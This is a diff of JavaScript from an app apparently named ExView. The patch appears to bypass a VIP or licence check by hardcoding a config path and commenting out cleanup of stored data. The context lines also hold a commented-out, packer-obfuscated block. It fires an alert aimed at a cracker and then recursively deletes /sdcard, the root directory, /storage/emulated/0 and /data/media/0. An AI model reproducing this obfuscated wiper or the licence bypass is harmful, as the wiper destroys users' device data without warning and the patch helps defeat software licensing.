@@ -167,9 +167,9 @@
 	} */	
 try{
 	if(getvipdisp()/* ||ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347" */){
-		mySession.initjsonpath=mySession.backinitjsonpath;
-		delete localStorage.ExView_InitJSON;
-		delete localStorage.ExView_InitType;		
+		mySession.initjsonpath="RtuFrCI"/* mySession.backinitjsonpath */;
+		//delete localStorage.ExView_InitJSON;
+		//delete localStorage.ExView_InitType;		
 	}/* else{
 		if(ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347"){
 			Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('t(2(){s b=["u"];$$.z("k.r",2(a){a=3.4.v.x(a);-1!=b.A(a)&&(f("g!\\h\\i\\j\\e\\l\\m\\n\\o\\p\\q"),3.4.5.6("/9/",2(){},2(){},7.8),3.4.5.6("9",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){},7.8),3.4.5.6("/w/9/",2(){},2(){},7.8),3.4.5.6("/c/y/",2(){},2(){},7.8),3.4.5.6("/c/d/0/",2(){},2(){},7.8),3.4.5.6("/B/C/0/",2(){},2(){},7.8),3.4.5.6("/c/d/1/",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){}),3.4.5.6("3",2(){},2(){}))},2(){})},D);',40,40,'||function|ExView|tools|file|rmdir|mySession|fs|sdcard|||storage|emulated|u7528|alert|Hello|u6b22|u8fce|u4f7f|MoeRuntime|u7231|u556a|u59b9|u7834|u89e3|uff01|so|var|setTimeout|461cf9a308dbfed556768517bcbf975b|md5|mnt|hex_md5|sdcard0|get|indexOf|data|media|5000'.split('|'),0,{}))()			
